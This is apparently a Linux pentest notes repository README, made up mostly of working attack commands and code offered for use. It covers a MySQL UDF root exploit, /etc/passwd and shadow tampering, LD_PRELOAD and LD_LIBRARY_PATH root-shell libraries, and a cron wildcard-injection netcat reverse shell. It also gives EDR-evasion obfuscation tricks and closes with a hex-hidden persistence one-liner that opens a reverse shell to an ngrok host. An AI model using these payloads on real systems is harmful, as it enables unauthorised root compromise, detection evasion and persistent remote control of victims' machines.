# Linux-Pentest
A repository to store some linux exploitation and technique i've seen during my studies

## List of contents:
- [Enumeration:](#Enumeration)
  - [Manuale Enumeration](#Manual-Enumeration)
      - [General]()
      - [Credential Harvesting]()
      - [Information Harvesting]()
      - [OS]()
      - [Network]()
      - [Detect Defense mechanisms]()

- [Privilege Escalation:](#Linux-Privesc)
  - [Privesc via mysql admin](#Privesc-via-mysql-admin)
  - [Weak file permissions](#Weak-file-permissions)
      - [/etc/passwd write right](#etcpasswd-write)
      - [/etc/shadow write right](#etcshadow-write)
      - [/etc/shadow read right](#etcshadow-read)
  - [Shell escape sequence](#Shell-escape-sequence)
  - [Sudo env variables](#Sudo-env-variables)
  - [Cron Jobs](#Cron-jobs)
  - [SUID/SGID](#SUIDSGID-binaries)
- [Linux-evasion:](#Linux-evasions)
  - [Obfuscation](#Obfuscation)
      - [Base64 encoding](#base64-encoding)
      - [Hex encoding](#hex-encoding)
      - [Wildcard completation](#wildcard-completation)
      - [String noise](#string-noise)
      - [Forbidden Chars](#forbidden-chars)
      - [Alternative Shell Execution](#alternative-shell-execution)
      - [Bashfuscator](#bashfuscator)
  - [Sandbox Bypass](#Sandbox-bypass)
    - [Python sandbox](#Python-sandbox)
      - [Forbidden import string](#Forbidden-import-string)
- [Persistence:](#Persistence)
  - [Obfuscated persistence](#Obfuscated-persistence)
  
---

# Enumerattion:

### Manuale Enumeration:

When gaining access to a Linux machine, the most crucial step is enumeration. We need to determine our identity, identify the system's current state, discover what is present, and gather other relevant information.




# Privilege Escalation:

### Privesc via mysql admin:
If the mysql service is running as root we can use a popular exploit to execute commands: 
We will use [Raptor exploit](https://www.exploit-db.com/exploits/1518) that we will compile on our local machine as follow.
```bash
curl https://www.exploit-db.com/download/1518 -o raptor.c
gcc -g -c raptor.c -fPIC
gcc -g -shared -Wl,-soname,raptor.so -o raptor.so raptor.o -lc
```
Once we have done that we can upload the raptor.so file to the victim machine (see file upload part).
To get an rce we need to run the following commands in mysql:
```bash
mysql -u root <pass> #if we have the password
```
Now in interactive shell:
```mysql
use mysql;
create table testing(line blob);
insert into testing values(load_file('/tmp/raptor.so'));
select * from testing into dumpfile '/usr/lib/mysql/plugin/raptor.so';
create function test_check returns integer soname 'raptor.so';
select test_check('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
By doing so we have created a copy of bash with the [SUID bit](https://www.computerhope.com/jargon/s/setuid.htm) set.

### Weak file permissions:
If we want to explore manually the file system to be a bit stealthier we can run this command
```bash
ls -la <file>
```
to get all the file permissions and attributes (pretty basic).

If we have those permissions to the files below, we can privesc to root(99% of times):

* /etc/passwd _write_
* /etc/shadow _read_ _write_

##### /etc/passwd write right:
The __/etc/passwd__ file was once used to store users password hashes, now it just contains users and informations word readable but (in some systems) we can still insert an hash and login with that.

We need to create the hash of the password we choose and it is also important to use the same algorithm __yescrypt__ as the linux system to remain as hidden as possible:

Command to generate the hash:
```bash
mkpasswd -m yescrypt <password>
```
example output: `$y$j9T$WWQkTwY3K4ypmjLPoz93h1$V08ZrcWG9OXtqM3wIWEF0ocUmJwxG7WPr19N5/nS9G2`

Now we can inject the password in a new root user:
```bash
echo 'newroot:$y$j9T$WWQkTwY3K4ypmjLPoz93h1$V08ZrcWG9OXtqM3wIWEF0ocUmJwxG7WPr19N5/nS9G2:0:0:root:/root:/bin/bash' >> /etc/passwd
```
Now we can login with our newroot user:
```bash
su newroot  #insert nuovapassword
```
##### /etc/shadow write right:
We can do pretty much the same thing that we did with /etc/passwd, this time we need to generate a different hash:
```bash
mkpasswd -m yescrypt <password>
```
example output: `$y$j9T$WWQkTwY3K4ypmjLPoz93h1$V08ZrcWG9OXtqM3wIWEF0ocUmJwxG7WPr19N5/nS9G2`

Once we have the hash we can change the occurency on the file:
```bash
root:<new_hash>:17298:0:99999:7:::
```
example output: `root:$y$j9T$WWQkTwY3K4ypmjLPoz93h1$V08ZrcWG9OXtqM3wIWEF0ocUmJwxG7WPr19N5/nS9G:17298:0:99999:7:::`
Now we can login as root:
```bash
su root #insert nuovapassword
```
##### /etc/shadow read right:
The /etc/shadow, as we saw above contains all the user's password hashes, so we can crack them to recover passwords:
```bash
echo -n '<password_hash>' > hash_to_crack.hash
```
Now we can either crack with john:
```bash
john <hash_to_crack>.hash -w=/usr/share/wordlists/rockyou.txt
```
or with hashcat (using also gpus):
```bash
hashcat hash_to_crack.hash
```
_For modern systems like kali or ubuntu we can crack the yescrypt hash like this:_
```bash
john hash_to_crack.hash --format=CRYPT -w=/usr/share/wordlists/rockyou.txt
```
_We can identify the hash with [haiti](https://github.com/noraj/haiti):_
```bash
sudo gem install haiti-hash
haiti '<hash>'
```
hashcat auto detects the hashtype and give us the hashtype number
```bash
hashcat -a 0 -m <hash_number_detected> hash_to_crack.hash  /usr/share/wordlists/rockyou.txt
```
For other files the technique may vary, but we can still search recursivly those files (may set allarms):
_With this command we will find all the files owned by __OUR CURRENT USER__:_
```bash
find / -user `whoami` -type f -exec ls -la {} \; 2>/dev/null | grep -v '/proc/*\|/sys/*'
```
_With this command we will find all the files of THE GROUP that we ARE IN:_
```bash
find / -group `whoami` -type f -exec ls -la {} \; 2>/dev/null | grep -v '/proc/*\|/sys/*'
```
_With this command we will find files that are WORD WRITEABLE:_
```bash
find / -writable ! -user `whoami` ! -group `whoami` -type f -exec ls -al {} \; 2>/dev/null | grep -v '/proc/*\|/sys/*'
```
Eventually we could also check for all the files word readable on the file stytem they are a lot:
```bash
#We can run this command on specific interesting directories:
find /opt/ -readable ! -user `whoami` ! -group `whoami` -type f -exec ls -laR {} \; 2>/dev/null
find /home/ -readable ! -user `whoami` ! -group `whoami` -type f -exec ls -laR {} \; 2>/dev/null
find /var/ -readable ! -user `whoami` ! -group `whoami` -type f -exec ls -laR {} \; 2>/dev/null
find /tmp/ -readable ! -user `whoami` ! -group `whoami` -type f -exec ls -laR {} \; 2>/dev/null
```
### Shell escape sequence:
some binaries in linux has a functionality where, by pressing a keyboard combination, we can spawn a shell, that's dangerous when one of those binaries is allowed to run with sudo.

This is a [list](https://gtfobins.github.io/#+shell) containing all the binaries that have a shell escape sequence
 
In general the most frequent way is by typing:
```bash
!/bin/sh
```
It may vary based on the programming language of the linux file.

### Sudo env variables:
when we call the sudo programm on linux we have 3 options:
1. File to run with sudo privilege
 
2. Path variable to set when calling the sudo command

3.Enviroment variable to set, keep or reset

Those variables MUST be resetted, or at least changed from the user ones in fact if a user can keep the `LD_PRELOAD` or `LD_LIBRARY_PATH` he can inject his own shared object before or while running the sudo executable.

#### LD_PRELOAD:
This variable loads the shared object to be run BEFORE the executable to run with sudo start to exploit this we need to create this C script named __preload.c__:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```
now we need to compile it with:
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```
Once we compiled either on the target or locally we need to have the file __preload.so__ on the target machine.

Now we can set the `LD_PRELOAD` variable to our shared object file and get a root shell:
```bash
sudo LD_PRELOAD=/tmp/preload.so <any_programm_to_run_with_sudo> #use your path to the .so file
```
#### LD_LIBRARY_PATH
This variable set the path of the shared library that the file runned with sudo will pick, to check which shared library our executable is importing we can do:
```bash
ldd <file_we_can_run_with_sudo> #here an example with /usr/bin/apache2
```
example output:
```bash
linux-vdso.so.1 =>  (0x00007fffa5ac3000)
libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f75564ba000)
libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f7556296000)
libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f755605c000)
libpthread.so.0 => /lib/libpthread.so.0 (0x00007f7555e40000)
libc.so.6 => /lib/libc.so.6 (0x00007f7555ad4000)
libuuid.so.1 => /lib/libuuid.so.1 (0x00007f75558cf000)
librt.so.1 => /lib/librt.so.1 (0x00007f75556c7000)
libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f7555490000)
libdl.so.2 => /lib/libdl.so.2 (0x00007f755528b000)
libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f7555063000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7556977000)
```
let's hikjack for example the `libuuid.so.1` file.

We need to create a C code named __library_path.c__:
```bash
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```
Now we can compile it with:
```bash
gcc -o /tmp/<.so_file_imported_by_sudofile> -shared -fPIC library_path.c
```
Then we just need to run the file by setting the path of the shared libraries:
```bash
sudo LD_LIBRARY_PATH=/tmp <file_to_run_with_sudo>  #apache2 for example
```
### Cron jobs:
Cron jobs are automatic tasks that runs every range of time indicated by a [time mask](https://crontab.guru/) are written in the `/etc/crontab` file and they follow this pattern:
```bash
#VARIABLES TO SET:

SHELL=/bin/sh     
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# CRONTAB FORAMT:
.---------------- minute (0 - 59) '*' means every unit of measure 
|  .------------- hour (0 - 23)
|  |  .---------- day of month (1 - 31)
|  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
|  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
|  |  |  |  |
*  *  *  *  *   user    <command_to_be_executed>
*  *  *  *  *   root    /bin/ls -la | /bin/grep 'a'
```
#### Writeable path:
If we can controll the path where the crontab is running (as elevated user) we can change the command.

Path must be first in order, otherwise our binary will come after the legit one

#### Wildcard Injection:
If a crontab has a command with a wildcard (and we can supply the value of the wildcard) we can get command injection.

Here we can see an example of wildcard:
```bash
* * * * * root /bin/ls -la /tmp/*
```
We can create a file name injection:
```bash
cd /tmp/
touch -- '$(busybox nc <ip> <port> -e bash)'  #enjoy your shell
```

### SUID/SGID binaries:
If we want to automatically run binaries with owner permissions, we can assign the SUID bit to the binary. This way, we don't need to switch users to run a command. Although it is quite helpful, this feature can also be dangerous because if the binary lacks proper protection, it retains the user token, which can be abused.

To assign SUID permission we can do:
```bash
chmod u+s <binary> #assign the user setuid
chmod 4755 <bianry> #assign the bit in octal
```
To assign SGID we can do:
```bash
chmod +g <binary>  #assign group id
chmod 2755 <binary>
```
If we want to set both SUID and GUID:
```bash
chmod +sgx <binary>  #assign SUID GUID and executable bit
chmod 6755 <binary>
```
To find those files in the filesystem we can use this command:
```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

we can also run two separate commands in order to find SUID or GUID:
SUID:
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
GUID:
```bash
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
For a general overview you can check this [page](https://gtfobins.github.io/#+suid) with a list of vulnerable binaries to SUID/GUID.

# Linux evasions:
In UNIX like world, Similary to windows, we have detection techniques and security measures.

In order to bypass them we need to out-smart those systems.
### Obfuscation:

##### Base64 encoding:
A way to evade signature-based detections is with command or strings obfuscation:

- Example 1:

We can generate a base64 paylod of the command we'd like to run:
```bash
echo -n '<command_to_execute>' | base64 -w0
```
To execute it on the target machine:
```bash
echo -n '<base64_payload>' | base64 -d | sh
```
- Example 2:

another base64 execution:
```bash
bash<<<$(base64 -d<<<'<base64_command>')
```
##### Hex encoding:
We can also use hexadecimal rapresentation

- Example 1:
```bash
echo -n '<command_to_execute>' | xxd -p | tr -d '\n'
```
to execute it:
```bash
echo -n '<hex_encoded_payload> | xxd -p -r | sh
```
- Example 2:
```bash
xxd -r -ps <(echo <hex_command>) | sh
```
- Example 3:
```bash
printf '<command_to_execute>' | od -A n -t x1 | sed 's/ //g' | sed 's/../\\x&/g' | tr -d '\n'
```
to execute it:
```bash
echo -e '<hex_encoded_string>' | sh
```
##### Wildcard completation:
We can obfuscate commands using [bash wildcard](https://linuxhint.com/bash_wildcard_tutorial/).

__MAY NOT WORK IF THE MACHINE HAS SOME PARTICULAR BINARIES THAT INTERFEER WITH THE PATH!__

This is an example on binary path(?):
```bash
/?i?/e?h? '<command_to_run>' | /?i?/b??h  #we will run /bin/echo ... | /bin/bash
```
This is an example with * wildcard (less stealthy):
```bash
/b*n/e*ho '<command_to_run>' | /b*n/b*sh
```
We can also list files without using ls:
```bash
cd <folder_to_list_files>
/*i*/e?h? *  #execute echo * resulting in ls
```
##### String Noise:
To evade some EDR or security products we can try to write some chars in weird way:

- _square braces chars:_
```bash
/[b][i][n]/[e][c][h][o] 'command_to_run' | /[b][i][n]/[s][h]
```
- _quoted chars:_
```bash
e'c'h''o'' 'command_to_run' | "b"a'''s'"h"'' 
```
- _backslashes:_
```bash
\e\c\h\o '<command_to_run>' | \b\as\h
/\/////bin///\/\////echo '<command_to_run>' | /\//bin/\/\/sh
```
- _at sign:_
```bash
e$@c$@h$@o $@'<command_to_run>'$@ | b$@a$@s$@h$@
```
- _uppercase transforming:_
```bash
$(tr "[A-Z]" "[a-z]"<<<"<camelcase_command_to_run>") #to execute commands like bUsYBox Nc ..
```
- _uppercase transformation with printf:_
```bash
$(a="<uppercase_command_to_run>";printf %s "${a,,}")
```
- _adding errors and fake commands:_
```bash
l$(a)s${IFS}-$(a)la #execute ls -la with IFS space bypass and $(a) null command
```
- _reversed strings:_
```bash
echo '<reversed_command>' | rev
```
also:
```bash
$(rev<<<'<reversed_command_to_run>')
```
##### Forbidden chars:
Somethimes we can't use chars like spaces or slashes.

- _forbidden spaces:_
```bash
ls${IFS}-la
```
```bash
{ls,-la}
```
```bash
ls$IFS-la
```
```bash
IFS=à
a=lsà-la
$a
```
```bash
IFS=,;`cat<<<ls,-la`
```
```bash
v=$'ls\x20-la'&&$v
```
```bash
echo${IFS}-e${IFS}"ls\x09-l"|sh
```
- _create a file with newlines escaped:_
```bash
echo${IFS}"command_to_execute"${IFS}|${IFS}sed${IFS}'s/./&\\\n/g'${IFS}>${IFS}file.txt
bash${IFS}file.txt 
```

##### Alternative shell execution:
We can bypass some security products by avoiding notorious shell names such as `sh, bash, rbash, dash, pwsh, tmux, screen ,zsh, ash, tcsh' too do so we can use tricks to call a shell:

- _Via shell variable:_
```bash
echo <command_to_execute> |$0
```
- _Via backticks:_
```bash
`echo <command_to_execute>`
```
- _Via command substitution:_
```bash
$(echo <command_to_execute>)
```
- _Via backticks and created files:_
```bash
mkdir /tmp/test  #we will create an empty folder
cd /tmp/test
touch -- 'command to execute'  #then we can create a file that as payload as name  
`ls`  #eventually with command substitution we can execute the file via getting its name
```
_Via backticks and Create file 2:_
```bash
cd /tmp/test
echo '' > 'command_to_execute'
`ls`
```

##### BashFuscator:
This powerfull [tool](https://github.com/Bashfuscator/Bashfuscator) can create large obfuscated payloads.

Commands to install it:
```bash
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
python3 setup.py install --user
```
#### DISCLAIMERS:
__DOESN'T WORK 100% OF TIME SO TEST IT BEFORE RUNNING (-test)!__

__YOU NEED A BASH INTERPRETER IN ORDER TO RUN IT!__

__FILE SIZE CAN RAMP UP PRETTY QUICKLY!__

__RUN MULTIPLE TIMES THE COMMAND TO GET A SMALLER PAYLOAD!__

Now we can generate payload like this (with -o we will save it to file):
```bash
bashfuscator -c '<command_to_run>' --no-file-write --no-random-whitespace --no-insert-chars --no-integer-mangling --no-terminator-randomization --choose-mutators command/case_swapper command/reverse -s 1 -t 3 --layers 2 -o /tmp/obfuscate_command.sh  
```
if this doesn't work try this one:
```bash
bashfuscator -c '<command_to_run>'  -o /tmp/obfuscated_command.sh --test #use --test to check the command
```
We can also obfuscate an entire script file like this:
```bash
bashfuscator -f '<file_to_run>'  -o /tmp/obfuscated_file.sh --test #use --test to check the command
```
## Sandbox bypass
Some applications can expose services with a restricted access like a bash with limitation, as we saw with the command above.<br>
There are some programming languages that has functionalities to run in a restricted enviroment.
### Python sandbox
Python has a configuration setup where you can specify which command are restricted and also which built-in modules you can use or import:
### Forbidden import string
```python
#!/usr/bin/env python3
import sys
import code

# for code.InteractiveConsole to send stack traces to stdout
sys.excepthook = sys.__excepthook__

class RestrictedConsole(code.InteractiveConsole):

	def __init__(self, locals, blacklist, *a, **kw):
		super().__init__(locals, *a, **kw)
		self.blacklist = blacklist.copy()
		
	def runsource(self, source, *a, **kw):
		if not source.isascii() or any(word in source for word in self.blacklist):
			print("Blacklisted word detected, exiting ...")
			sys.exit(1)
		return super().runsource(source, *a, **kw)
	
	def write(self, data):
		sys.stdout.write(data)

# keep all the builtins except open
safe_builtins = {
	k:v for k,v in __builtins__.__dict__.items() if k != "open" 
}
locals = {'__builtins__': safe_builtins}

blacklist = ['import', 'os', 'system', 'subproces', 'sh']

RestrictedConsole(locals, blacklist).interact()
```
We can bypass a restriction above in some ways like:
```bash
echo -n "<python_script_to_run>" | od -An -vtu1 |  sed 's/  / /g' | sed 's/ /\\/g' | tr -d '\n' #encode in ascii format \137...
```
Then you can just pass the output of the command inside the `exec()` function:
```python
exec("<ascii_code>")
#example: exec("\70\72\69\6e\74\28\22\68\65\6c\6c\6f\20\77\6f\72\6c\64\22\29") #print hello world
```

# Persistence
Once we gained command execution on the machine we need to access it whenever we want, also even after a restart for this reason we need to install persistence on the machine, possibly in a obfuscated way.

### Obfuscated persistence
we can create a clever payload, mixing some of the obfuscation techniques we saw above:
_Shell via filename:_
```bash
mkdir /tmp/a2b3c4;cd /tmp/a2b3c4;touch -- 'echo -e \x62\x75\x73\x79\x62\x6f\x78\x20\x6e\x63\x20\x37\x2e\x74\x63\x70\x2e\x65\x75\x2e\x6e\x67\x72\x6f\x6b\x2e\x69\x6f\x20\x31\x30\x32\x38\x33\x20\x2d\x65\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x26';cd ../; `ls a2b3c4`|$0;rm -rf a2b3c4
```

